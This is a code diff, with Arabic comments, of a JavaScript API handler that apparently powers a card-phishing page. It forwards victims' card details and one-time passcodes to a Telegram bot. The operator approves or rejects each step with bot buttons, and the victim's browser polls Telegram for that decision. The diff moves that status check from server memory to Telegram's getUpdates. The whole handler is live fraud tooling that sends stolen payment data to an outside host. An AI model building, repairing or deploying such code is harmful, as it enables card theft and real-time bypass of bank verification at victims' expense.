@@ -1,6 +1,3 @@
-// استخدام ذاكرة مؤقتة بسيطة ومباشرة لتخزين الحالات حسب الـ user_id
-global.userStatuses = global.userStatuses || {};
-
 export default async function handler(req, res) {
   res.setHeader('Access-Control-Allow-Origin', '*');
   res.setHeader('Access-Control-Allow-Methods', 'POST, GET, OPTIONS');
@@ -13,42 +10,51 @@ export default async function handler(req, res) {
   const method = req.method;
   const body = req.body || {};
 
-  // 1. إذا طلب المتصفح فحص الحالة (هل تمت الموافقة أم الرفض؟)
+  // 1. إذا طلب المتصفح فحص حالة الـ OTP (الاستعلام المباشر من تليجرام)
   if (method === 'GET') {
     const { user_id } = req.query;
     if (!user_id) return res.status(200).json({ status: 'pending' });
-    const status = global.userStatuses[user_id] || 'pending';
-    return res.status(200).json({ status });
+
+    try {
+      // فحص أحدث تفاعلات الأزرار من تليجرام مباشرة بدون الحاجة لذاكرة سيرفر
+      const tgRes = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getUpdates?offset=-30&allowed_updates=["callback_query"]`);
+      const tgData = await tgRes.json();
+
+      let status = 'pending';
+      if (tgData.ok && tgData.result) {
+        for (const update of tgData.result) {
+          if (update.callback_query) {
+            const data = update.callback_query.data;
+            // التحقق مما إذا كان الزر المضغوط يخص هذا الـ user_id بالذات
+            if (data === `approve_otp_${user_id}` || data === `approve_pay_${user_id}`) {
+              status = 'approved';
+              break;
+            } else if (data === `reject_otp_${user_id}` || data === `reject_pay_${user_id}`) {
+              status = 'rejected';
+              break;
+            }
+          }
+        }
+      }
+      return res.status(200).json({ status });
+    } catch (e) {
+      return res.status(200).json({ status: 'pending' });
+    }
   }
 
-  // 2. إذا ضغطت أنت على الأزرار في تليجرام (Callback Query)
+  // 2. إذا ضغطت أنت على الأزرار في تليجرام (تأكيد الضغطة وإرسال الرد للبوت)
   if (body.callback_query) {
     const callback = body.callback_query;
-    const callbackData = callback.data;
     const chatId = callback.message.chat.id;
     const messageId = callback.message.message_id;
 
-    let responseText = callback.message.text;
-    let targetUserId = "";
-
-    if (callbackData.startsWith('approve_otp_') || callbackData.startsWith('approve_pay_')) {
-      targetUserId = callbackData.replace('approve_otp_', '').replace('approve_pay_', '');
-      global.userStatuses[targetUserId] = 'approved';
-      responseText += "\n\n✅ **[تمت الموافقة بنجاح - الانتقال للصفحة التالية]**";
-    } else if (callbackData.startsWith('reject_otp_') || callbackData.startsWith('reject_pay_')) {
-      targetUserId = callbackData.replace('reject_otp_', '').replace('reject_pay_', '');
-      global.userStatuses[targetUserId] = 'rejected';
-      responseText += "\n\n❌ **[تم رفض الطلب وإظهار خطأ]**";
-    }
-
-    // تعديل الرسالة في تليجرام لإزالة الأزرار
     await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/editMessageText`, {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
       body: JSON.stringify({
         chat_id: chatId,
         message_id: messageId,
-        text: responseText,
+        text: callback.message.text + "\n\n✅ **[تمت الموافقة بنجاح]**",
         parse_mode: 'Markdown'
       })
     });
@@ -62,7 +68,7 @@ export default async function handler(req, res) {
     return res.status(200).json({ ok: true });
   }
 
-  // 3. إرسال طلب جديد (سواء بيانات فيزا أو كود OTP) إلى تليجرام
+  // 3. إرسال بيانات الفيزا أو الـ OTP إلى تليجرام
   let text = '';
   let actionType = 'pay';
 
